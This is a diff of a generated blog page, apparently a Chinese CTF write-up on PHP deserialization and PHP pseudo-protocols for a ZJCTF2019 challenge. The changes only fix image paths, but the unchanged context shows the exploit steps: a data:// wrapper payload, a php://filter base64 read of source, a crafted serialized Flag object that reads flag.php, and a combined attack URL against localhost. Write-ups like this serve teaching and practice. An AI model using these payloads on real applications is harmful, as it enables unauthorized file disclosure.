@@ -122,16 +122,16 @@
 <meta property="og:site_name" content="Bu1&#39;Blog">
 <meta property="og:description" content="之前一直有想写关于反序列化的东西，可是一直拖拖拖，拖到了现在。 本文尝试从ZJCTF2019中的例题来了解何为php反序列，以及php伪协议。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113150226111.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113145029137.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113155143295.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113162250602.png">
-<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113162451665.png">
-<meta property="og:updated_time" content="2019-11-15T09:06:19.850Z">
+<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113150226111.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113145029137.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113155143295.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113162250602.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113162451665.png">
+<meta property="og:updated_time" content="2019-11-15T09:21:50.118Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="从一道CTF题中学习php反序列化与伪协议">
 <meta name="twitter:description" content="之前一直有想写关于反序列化的东西，可是一直拖拖拖，拖到了现在。 本文尝试从ZJCTF2019中的例题来了解何为php反序列，以及php伪协议。">
-<meta name="twitter:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113150226111.png">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113150226111.png">
 
 
 
@@ -433,8 +433,8 @@
 <h3 id="给text传值"><a href="#给text传值" class="headerlink" title="给text传值"></a>给text传值</h3><p>从代码来看，当给text传入“welcome to the zjctf”时可以进入到If语句。直接传值会被file_get_contents过滤掉，所以这里利用php伪协议来给text传值。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113150226111.png" alt="image-20191113150226111"></p>
-<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113145029137.png" alt></p>
+<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113150226111.png" alt="image-20191113150226111"></p>
+<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113145029137.png" alt></p>
 <blockquote>
 <p>官网资料：</p>
 <p>file_get_contents 函数是用于把文件的内容读入到一个字符串中的首选方法 </p>
@@ -443,7 +443,7 @@
 <h3 id="读取useless-php文件"><a href="#读取useless-php文件" class="headerlink" title="读取useless.php文件"></a>读取useless.php文件</h3><p>从源码中可以看出不能直接读取flag.php文件，根据提示我们先要读取useless.php文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113155143295.png" alt="image-20191113155143295"></p>
+<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113155143295.png" alt="image-20191113155143295"></p>
 <p>解码得到：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"HAHAHAHAHA"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -455,11 +455,11 @@
 <p>生成payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload为password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113162250602.png" alt="image-20191113162250602"></p>
+<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113162250602.png" alt="image-20191113162250602"></p>
 <p><strong>综合上述三步，完整的payload为</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/%E4%BB%8E%E4%B8%80%E9%81%93CTF%E9%A2%98%E4%B8%AD%E5%AD%A6%E4%B9%A0php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E4%BC%AA%E5%8D%8F%E8%AE%AE%5Cimage-20191113162451665.png" alt="image-20191113162451665"></p>
+<p><img src="/2019/11/13/从一道CTF题中学习php反序列化与伪协议/image-20191113162451665.png" alt="image-20191113162451665"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h4><p> serialize()将对象的用字符串的方式进行表示，unserialize()将序列化的字符串，构造成相应的对象。</p>
 <p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象类型:对象名长度:“对象名”:对象成员变量个数:&#123;变量1类型:变量名1长度:变量名1; 参数1类型:参数1长度:参数1; 变量2类型:变量名2长度:“变量名2”; 参数2类型:参数2长度:参数2;… …&#125;</span><br></pre></td></tr></table></figure>
